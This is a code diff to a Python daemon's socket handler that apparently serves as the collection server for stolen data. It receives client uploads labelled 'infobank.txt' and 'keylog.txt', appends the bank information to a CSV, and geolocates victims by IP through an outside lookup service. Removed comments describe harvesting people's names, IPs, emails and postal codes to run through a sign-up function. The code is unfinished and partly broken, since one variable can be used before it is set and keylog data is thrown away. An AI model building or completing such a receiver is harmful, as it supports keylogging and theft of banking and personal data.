@@ -37,7 +37,7 @@
  #
 #==============================================================================
 
-import csv
+import json
 import errno
 import random
 import os
@@ -348,33 +348,25 @@ class MyDaemon(Daemon):
         else:
             print("I am alive")
 
-def handle(conn):
-    
-    chan = conn #begins comms
-    request = chan.recv(1024)
+def handle(conn): #
+    chan = conn
+    request = chan.recv(1024).decode()
     logger.info("Client said this ->" + str(request))
     print("Client said this ->" + str(request))
-    
-    request = conn.recv(1024)
-    logger.info("Client said this ->" + str(request))
-    print("Client said this ->" + str(request))
-
-   
-   # if os.path.exists("peopleInfo.csv"):
-      #  with open('peopleInfo.csv','w',newLine='') as f:#first arg may change, its the csv file name
-        #    writer=csv.writer(f)
-          #  thewriter.writerow(['First Name','Last Name','IP','Location','Email','Domain','Postal Code')
-        #here we'll recv the info being sent back by the client assuming its an array as of now
-    #with open('peopleInfo.csv','w',newLine='') as f:#first arg may change, its the csv file name
-        #writer=csv.writer(f)
-        #for i in range():
-            #for j in range(7):#any blank inputs are chaged to null
-               # if (len(data[i][j])<1):
-                    #data[i][j]="null"
-            #thewriter.writerow([data1[i][0],data1[i][1],data1[i][2],data1[i][3],data1[i][4],data1[i][5],data1[i][6]])
-            #Alistairs signUp function called here with each row of data
-            #signUp(data1[i])
-            
+    print(str(request))
+    if request=='infobank.txt':
+        print("recieved bank.txt")
+        info=chan.recv(1024).decode('utf-8')
+        seperated=info.split(',')
+        with open('dosthiswork.csv', 'a',  newline='') as writer:
+            writer.write(info)
+    elif request=='keylog.txt':
+        chan.recv(2048)
+    response=requests.get("http://ip-api.com/json/%s"%(seperated[5]))
+    print(response.status_code)
+    txt=json.dumps(response.json())
+    print(txt)
+    #signUp(data1[i])
     print("Done!")
     try:
         conn.close()
@@ -418,4 +410,4 @@ if __name__=="__main__":
         sys.exit(0)
     else:
         print('usage: %s start|stop|restart'%sys.argv[0])
-        sys.exit(2)
+sys.exit(2)
